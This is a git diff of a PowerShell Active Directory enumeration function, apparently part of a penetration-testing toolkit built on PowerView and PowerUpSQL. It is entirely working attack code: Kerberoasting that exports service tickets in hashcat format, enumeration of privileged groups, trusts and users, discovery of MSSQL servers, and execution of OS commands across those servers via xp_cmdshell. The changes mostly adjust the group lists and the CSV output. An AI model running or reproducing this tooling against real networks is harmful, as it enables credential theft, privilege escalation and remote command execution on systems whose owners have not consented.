@@ -230,9 +230,10 @@ Function Start-ADEnum {
             $SPNS = Get-DomainUser -SPN -Domain $Domain -Server $DC | Get-DomainSPNTicket -OutputFormat hashcat
 
             $Groups = @(
-                "Domain Admins"
-                "Enterprise Admins"
                 "Administrators"
+                "Account Operators"
+                "Backup Operators"
+                "Schema Admins"
             )
 
             foreach ($Group in $Groups) {
@@ -252,23 +253,8 @@ Function Start-ADEnum {
                 $object | Export-CSV ($Folder, $Domain + "_" + "SPNs.csv" -join "") -NoTypeInformation -Append
             }
 
-#            #Gathering members of specific domain groups
-#            $Groups = @(
-#                "Domain Admins"
-#                "Enterprise Admins"
-#                "Administrators"
-#                "Account Operators"
-#                "Backup Operators"
-#                "Cert Publishers"
-#                "DnsAdmins"
-#                "Hyper-V Administrators"
-#            )
-#            foreach ($Group in $Groups) {
-#                Get-NetGroupMember -Identity $Group -Domain $Domain -Server $DC -Recurse | Export-CSV ($Folder, $Domain + "_" + "$Group.csv" -join "") -NoTypeInformation
-#            }
-
             #Dump Trust details specifically looking for TGT delegation settings
-            Get-ADTrust -Filter * -Server $DC.Value | Out-File ($Folder, $Domain + "_" + "Trusts.txt" -join "") -NoTypeInformation
+            Get-ADTrust -Filter * -Server $DC | Export-CSV ($Folder, $Domain + "_" + "Trusts.csv" -join "") -NoTypeInformation
 
             #Dumping all AD user objects
             $Users = Get-DomainUser * -Domain $Domain -Server $DC
@@ -715,23 +701,9 @@ Function Start-ADEnum {
 
             #Importing needed modules
             Import-Module "C:\tools\PowerUpSQL\PowerUpSQL.psm1"
+            Import-Module "C:\Tools\PowerSploit\Recon\PowerView.ps1"
 
-            $MSSQLServers = Get-SQLInstanceDomain
-
-            foreach ($Server in $MSSQLServers) {
-                $MSSQLProperties = [ordered]@{
-                    'Description'   = $Server.Description
-                    'ComputerName'  = $Server.ComputerName
-                    'IPAddress'     = ($Server.ComputerName | Get-IPAddress).IPAddress
-                    'Instance'      = $Server.Instance
-                    'DomainAccount' = $Server.DomainAccount
-                    'Service'       = $Server.Service
-                    'Spn'           = $Server.SPN
-                }
-
-                $object = New-Object -TypeName PSObject -Property $MSSQLProperties
-                $object | Export-Csv ($Folder, $Domain + "_" + "MSSQLServers.csv" -join "") -NoTypeInformation -Append
-            }
+            $MSSQLServers = Get-SQLInstanceDomain | Export-Csv ($Folder, $Domain + "_" + "MSSQLServers.csv" -join "") -NoTypeInformation
 
             #Identify MSSQL sysadmin privileges with the current domain account
             $Targets = $MSSQLServers | Get-SQLConnectionTestThreaded -Verbose -Threads 10
@@ -758,7 +730,7 @@ Function Start-ADEnum {
             Import-Module "C:\tools\PowerUpSQL\PowerUpSQL.psm1"
 
             $Targets = Get-SQLInstanceDomain -verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10
-            $Targets | Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 | Export-Csv ($Folder, $Domain + "_" + "MSSQLServers_xpcmdshell.csv" -join "") -NoTypeInformation -NoTypeInformation
+            $Targets | Invoke-SQLOSCmd -Verbose -Command "Whoami" -Threads 10 | Export-Csv ($Folder, $Domain + "_" + "MSSQLServers_xpcmdshell.csv" -join "") -NoTypeInformation
             }
 
         $QuickScanPingCastle = {
